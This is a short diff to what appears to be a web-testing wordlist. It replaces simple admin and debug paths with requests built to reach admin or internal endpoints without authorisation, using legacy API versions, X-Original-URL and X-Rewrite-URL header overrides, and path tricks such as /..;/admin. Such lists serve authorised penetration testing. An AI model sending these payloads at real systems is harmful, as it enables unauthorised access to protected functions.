@@ -1,13 +1,16 @@
-/api/v1/user
-/api/v2/user
-/api/v3/user
-/admin/login
-/login.php
-/auth/admin
-/v1/admin
-/v2/admin
-/api/admin
-?admin=true
-?debug=1
-?internal=1
-/api/user;admin=true
+GET /api/v2/users (bypass v1 auth)
+GET /api/v0/admin
+GET /api/legacy/admin
+GET /old/admin
+GET /backup/admin
+GET /api/mobile/admin
+GET /api/internal/users
+GET /?direct=1
+GET /index.php?page=admin
+GET /admin.php
+GET /admin.asp
+GET /admin.aspx
+X-Original-URL: /admin
+X-Rewrite-URL: /admin
+GET /..;/admin
+GET /;/admin
